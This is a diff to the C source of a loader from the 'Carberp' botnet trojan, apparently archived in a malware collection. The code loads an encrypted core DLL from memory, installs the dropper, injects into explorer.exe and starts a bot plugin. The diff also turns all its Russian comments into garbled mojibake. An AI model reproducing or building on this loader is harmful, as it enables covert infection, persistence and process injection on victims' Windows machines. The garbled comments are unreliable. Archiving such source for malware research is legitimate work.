@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 
 #pragma comment(linker, "/ENTRY:LoaderMain" )
@@ -11,11 +22,11 @@
 
 
 
-char  DropperName[MAX_PATH];  // Имя ехе стартующего файла
-DWORD DropperPID = 0; // PID дропера бота
+char  DropperName[MAX_PATH];  // пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+DWORD DropperPID = 0; // PID пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 
 
-//  Подключаем DLL ядра
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ DLL пїЅпїЅпїЅпїЅ
 namespace CoreDll
 {
 	#include "CoreDllData.cpp"	
@@ -24,7 +35,7 @@ namespace CoreDll
 
 
 //---------------------------------------------------------------------
-//  Функция запускает плагин
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 //---------------------------------------------------------------------
 void StartBotPlug(LPVOID Buf)
 {
@@ -37,7 +48,7 @@ void StartBotPlug(LPVOID Buf)
 		if (Start)
 		{
 			Start(NULL, NULL, NULL);
-			OutputDebugStringA("-------------------------------------Плагин запущен");
+			OutputDebugStringA("-------------------------------------пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 		}
 	}
 }
@@ -46,16 +57,16 @@ void StartBotPlug(LPVOID Buf)
 
 
 //---------------------------------------------------------------------
-//  Функция загрузки плагина
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //---------------------------------------------------------------------
 DWORD WINAPI ExplorerMainProc(LPVOID)
 {
-	// Загружаем dll 
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ dll 
 	InitializeAPI();
 	pOutputDebugStringA("1");
 	LPVOID Handle = MemoryLoadEncryptedLibrary(CoreDll::data);
 OutputDebugStringA("2");
-	// Этап первый. Инсталируем ехе
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 	TInstall Install = (TInstall)MemoryGetProcAddress(Handle, COREDLL_INSTALL);
 	OutputDebugStringA("3");
 	if (Install)
@@ -64,7 +75,7 @@ OutputDebugStringA("2");
 		Install(DropperName, FALSE, TRUE, DropperPID); 
 	}
 	OutputDebugStringA("5");
-	// Загружаем плагин
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	TLoadBotPlug LoadBP = (TLoadBotPlug)MemoryGetProcAddress(Handle, COREDLL_LOADBOTPLUG);
 	TFreeBotPlug FreeBP = (TFreeBotPlug)MemoryGetProcAddress(Handle, COREDLL_FREEBOTPLUG);
 
@@ -81,7 +92,7 @@ OutputDebugStringA("2");
 
 
  OutputDebugStringA("8");
-	// Выгружаем длл ядра
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	MemoryFreeLibrary(Handle);
 
 	OutputDebugStringA("9");
@@ -93,20 +104,20 @@ OutputDebugStringA("2");
 
 
 //---------------------------------------------------------------------
-//  Основная функция txe  
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ txe  
 //---------------------------------------------------------------------
 int APIENTRY LoaderMain() 
 {
-	// Получаем имя дропера
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	DropperPID = GetCurrentProcessId();
 	GetModuleFileNameA(NULL, DropperName, MAX_PATH);
 
 
-	// Загружаем библиотеку 
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 
 	LPVOID Handle = MemoryLoadEncryptedLibrary(CoreDll::data);
 
 	LPVOID Proc = MemoryGetProcAddress(Handle, COREDLL_INJECTINTOEXPLORER);
-	// Инжектимя в explorer.exe
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ explorer.exe
 	if (Proc)
 	{
 		(TInjectIntoExplorer(Proc))(ExplorerMainProc);
